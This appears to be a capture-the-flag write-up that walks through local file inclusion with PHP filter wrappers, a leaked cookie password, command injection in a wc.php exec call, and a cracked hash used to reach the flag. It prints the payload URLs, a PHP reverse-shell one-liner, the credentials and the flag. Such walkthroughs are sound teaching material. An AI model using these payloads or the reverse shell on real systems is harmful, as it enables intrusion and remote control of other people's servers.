# CTF Write-up: Local File Inclusion (LFI) and OS Command Injection

## Challenge Summary
The application was vulnerable to Local File Inclusion (LFI), allowing us to read system files. The vulnerability was found at:
```
http://43.205.178.174:8181/?file=
```

### Step 1: Exploiting LFI with PHP Wrappers
To read files, we used PHP wrappers, specifically `php://filter` to base64 encode the output.
```
http://43.205.178.174:8181/?file=php://filter/read=convert.base64-encode/resource=wc.php
```

After decoding the base64 response, we retrieved the content of `wc.php`, revealing the following important check:
```php
if ($_COOKIE['password'] !== getenv('PASSWORD')) {
    setcookie('password', 'PASSWORD');
    die('Sorry, only people from CTF7 are allowed to access this page.');
}
```
This indicated that a valid cookie password from an environment variable was needed.

### Step 2: Finding the Password
The `robots.txt` file referenced `checkpass.php`, which we retrieved using LFI:
```
http://43.205.178.174:8181/?file=php://filter/read=convert.base64-encode/resource=checkpass.php
```
Decoding it revealed:
```php
$password = "w0rdc0unt123";
```
This was the cookie password needed to bypass the authentication check in `wc.php`.

### Step 3: Gaining Command Execution
After setting the cookie with the password, we gained access to `wc.php`, which contained an OS command injection vulnerability in:
```php
exec('printf '' . $text . '' | wc -c')
```
By injecting shell commands, we spawned a reverse shell using:
```bash
php -r '$sock=fsockopen("$your_adress_ip", $port);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Step 4: Privilege Escalation
Using `find`, we searched for `flag.txt`:
```bash
find / -name flag.txt 2>/dev/null
```
It was located at:
```
/ctf/system/of/a/down/flag.txt
```
However, it was only accessible by `ctf` or `root` users. In `/ctf`, a `README` file contained a hashed password:
```
6f246c872cbf0b7fd7530b7aa235e67e
```
Cracking it with CrackStation revealed the password: `csictf`.

### Step 5: Reading the Flag
We switched to the `ctf` user using:
```bash
su ctf
Password: csictf
```
Navigating to the flag directory:
```bash
cd /ctf/system/of/a/down/
cat flag.txt
```
Flag obtained:
```
ctf7{1nj3ct10n_is_p41nfu1}
```


